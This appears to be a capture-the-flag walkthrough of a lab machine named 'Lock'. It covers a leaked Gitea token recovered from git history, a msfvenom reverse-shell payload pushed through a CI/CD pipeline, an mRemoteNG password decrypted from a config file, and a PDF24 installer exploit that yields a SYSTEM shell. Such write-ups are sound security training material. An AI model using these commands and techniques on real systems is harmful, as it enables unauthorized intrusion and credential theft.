# Lock (easy)

## port scan
![](walkthrough_20240409222405175.png)

## web discover

we have git leak

![](walkthrough_20240409220011696.png)

but return 403

## gitea discover

![](walkthrough_20240409222458302.png)

![](walkthrough_20240409222528749.png)

use `git log -p ` to dump all diff. We found a token `43ce39bb0bd6bc489284f2905f033ca467a6362f`

![](walkthrough_20240409222840196.png)


worked !

![](walkthrough_20240409223316091.png)

## get a shell

we have website.git

![](walkthrough_20240409223425998.png)

we can use `git clone $token@$target_repo` format to clone repo

![](walkthrough_20240409223522140.png)

ci/cd is enable which mean we can change this repo and get shell via ci/cd

![](walkthrough_20240409224452657.png)

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.1.167 LPORT=80 -f aspx -o shell.aspx
```

add shell.aspx to project directory

just push our evil code to remote repo

![](walkthrough_20240409224719558.png)

use curl command ang we get a shell!

```
git add .
git commit -m 'update shell console to dev'
git push -u origin main
```

![](walkthrough_20240409224833005.png)

### runas Gale.Dekarios
there have some creds

![](walkthrough_20240409225121860.png)

![](walkthrough_20240409225316514.png)

there have Gale.Dekarios user encrypt password in config.xml

![](walkthrough_20240409230829041.png)

so this is something called mRemoteNG


![](walkthrough_20240409230852799.png)


now we have plaintext password

![](walkthrough_20240409230248713.png)

we can use this password rdp into target

![](walkthrough_20240409230005611.png)


## Privilege Escalation


because there have a software called `PDF24`

google!

![](walkthrough_20240409231454409.png)

![](walkthrough_20240409231655957.png)

this exploit seems must use installed.msi. so we have to find a msi file called `pdf24-creator-11.14.0-x64.msi`


![](walkthrough_20240409231849001.png)

got it!

![](walkthrough_20240409231905319.png)

build tool

![](walkthrough_20240409232716293.png)

wait sometime

![](walkthrough_20240409234909290.png)


we have system cmd!

![](walkthrough_20240409233530701.png)

just follow the post, our target is open web browser 

![](walkthrough_20240409233611214.png)

select legacy console model

![](walkthrough_20240409233630760.png)

don't select edge. seems edge can't run on this windows version. it doesn't pop up edge 

![](walkthrough_20240409233719407.png)

we launch system firefox web browser

![](walkthrough_20240409235401600.png)


![](walkthrough_20240409235445495.png)

firefox open file `Ctrl + O`

![](walkthrough_20240409235615006.png)


![](walkthrough_20240409235641885.png)

we get system cmd shell !

![](walkthrough_20240409235658744.png)